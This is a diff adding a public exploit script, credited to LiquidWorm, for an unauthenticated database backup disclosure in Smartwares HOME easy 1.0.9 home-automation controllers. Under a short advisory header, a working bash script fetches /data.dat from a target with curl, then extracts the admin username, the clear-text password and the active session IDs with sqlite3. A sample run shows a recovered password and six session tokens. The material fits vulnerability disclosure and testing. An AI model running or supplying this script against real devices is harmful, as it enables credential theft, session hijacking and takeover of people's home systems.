@@ -1,0 +1,62 @@
+# Title: Smartwares HOME easy 1.0.9 - Database Backup Information Disclosure
+# Author: LiquidWorm
+# Date: 2019-11-05
+# Vendor: Smartwares
+# Product web page: https://www.smartwares.eu
+# Affected version: <=1.0.9
+# Advisory ID: ZSL-2019-5541
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5541.php
+# CVE: N/A
+
+# Summary: Home Easy/Smartwares are a range of products designed to remotely
+# control your home using wireless technology. Home Easy/Smartwares is very
+# simple to set up and allows you to operate your electrical equipment like
+# lighting, appliances, heating etc.
+#
+# Desc: The home automation solution is vulnerable to unauthenticated database
+# backup download and information disclosure vulnerability. This can enable the
+# attacker to disclose sensitive and clear-text information resulting in authentication
+# bypass, session hijacking and full system control.
+
+#!/bin/bash
+#
+# ==============================================================================
+# root@kali:~/homeeasy# ./he_info.sh http://192.168.1.177:8004
+# Target: http://192.168.1.177:8004
+# Filename: 192.168.1.177:8004-16072019-db.sqlite
+# Username: admin
+# Password: s3cr3tP4ssw0rd
+# Version: 1.0.9
+# Sessions: 
+# ------------------------------------------------------------------
+# * Ft5Mkgr5i9ywVrRH4mAECSaNJkTp5oiC0fpbuIgDIFbE83f3hGGKzIyb3krXHBsy
+# * Gcea4Ald4PlVGkOh23mIohGq2Da6h4mX0A8ibkm7by3QSI8TLmuaubrvGABWvWMJ
+# * JFU4zpdhuN4RTYgvvAhKQKqnQSvc8MAJ0nMTLYb8F6YzV7WjHe4qYlMH6aSdOlN9
+# * VtOqw37a12jPdJH3hJ5E9qrc3I4YY1aU0PmIRkSJecAqMak4TpzTORWIs1zsRInd
+# * flR4VjFmDBSiaTmXSYQxf4CdtMT3OQxV0pQ1zwfe98niSI9LIYcO3F2nsUpiDVeH
+# * rCfrAvnfnl6BsLjF9FjBoNgPgvqSptcH0i9yMwN3QSDbwNHwu19ROoAVSROamRRk
+# ------------------------------------------------------------------
+# ==============================================================================
+
+if [ "$#" -ne 1 ]; then
+    echo "Usage: $0 http://ip:port"
+    exit 0
+fi
+TARGET=$1
+CHECK=$(curl -Is $TARGET/data.dat 2>/dev/null | head -1 | awk -F" " '{print $2}')
+if [[ "$?" = "7" ]] || [[ $CHECK != "200" ]]; then
+    echo "No juice."
+    exit 1
+fi
+echo "Target: "$TARGET
+FNAME=${TARGET:7}-$(date +"%d%m%Y")
+curl -s $TARGET/data.dat -o $FNAME-db.sqlite
+echo "Filename: $FNAME-db.sqlite"
+echo "Username: "$(sqlite3 $FNAME-db.sqlite "select usrname from usr") # default: admin
+echo "Password: "$(sqlite3 $FNAME-db.sqlite "select usrpassword from usr") # default: 111111
+echo "Version: "$(sqlite3 $FNAME-db.sqlite "select option_value1 from option LIMIT 1 OFFSET 3")
+echo -ne "Sessions: \n"
+printf "%0.s-" {1..66}
+printf "\n"
+sqlite3 $FNAME-db.sqlite "select sessionid from sessiontable" | xargs -L1 echo "*"
+printf "%0.s-" {1..66} ; printf "\n\n"
